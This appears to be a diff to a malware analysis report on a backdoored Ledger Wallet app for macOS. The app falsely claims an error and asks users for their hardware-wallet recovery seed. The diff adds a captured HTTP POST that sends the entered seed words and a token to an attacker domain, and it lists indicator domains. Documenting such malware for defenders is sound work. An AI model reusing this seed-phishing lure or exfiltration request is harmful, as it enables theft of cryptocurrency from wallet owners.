@@ -932,13 +932,38 @@ A likely fake error message is then returned, despite the recovery seeds being s
 
 ## Ledger Backdoor
 
-The zip archive can be downloaded by maintaining the same headerrs as the malware.
-It contains an Info.plist and App.asar (Electron App) which will replace the legitimate Ledger Application if it's installed.
+Upon execution of the backdoored Ledger application, it tells you there was a problem and you need to enter your recovery seed from the hardware wallet.
 
-App.asar can be unpacked with 'asar extract'
+<img width="1026" height="775" alt="image" src="https://github.com/user-attachments/assets/683114d9-f2b3-4faf-8699-f6f84af5952f" />
+
+<img width="1029" height="768" alt="image" src="https://github.com/user-attachments/assets/28efc376-203e-444e-bfdf-c103eeef9121" />
+
+Unsurprisingly, the seed is then exfiltrated to an attacker controlled domain, this time, it's: 'main[.]ledger-gate[.]coupons'
+
+```
+POST /modules/wallets HTTP/1.1
+Host: main.ledger-gate.coupons
+Connection: keep-alive
+Content-Length: 356
+Cache-Control: max-age=0
+sec-ch-ua-platform: "macOS"
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) LedgerWallet/2.133.0 Chrome/140.0.7339.133 Electron/38.2.0 Safari/537.36
+sec-ch-ua: "Not=A?Brand";v="24", "Chromium";v="140"
+Content-Type: application/json
+sec-ch-ua-mobile: ?0
+Accept: */*
+Sec-Fetch-Site: cross-site
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Accept-Encoding: gzip, deflate, br, zstd
+Accept-Language: en-GB
+
+{"seedwords":["123","123","123","123","123","123","123","123","123","123","123","123","123","123","123","123","123","123","123","123","123","123","123","123"],"token":"270653f862f0ee21dce0a46e4801ec28db4ddc77b6fba9341b1b8db29909c514","app":"ledger","url":"file:///Applications/Ledger%20Wallet.app/Contents/Resources/app.asar/.webpack/recovery-step-3.html"}
+```
 
 
 
 ## IOCs
 ballfrank[.]today
 macfilearchive[.]com
+ledger-gate[.]coupons
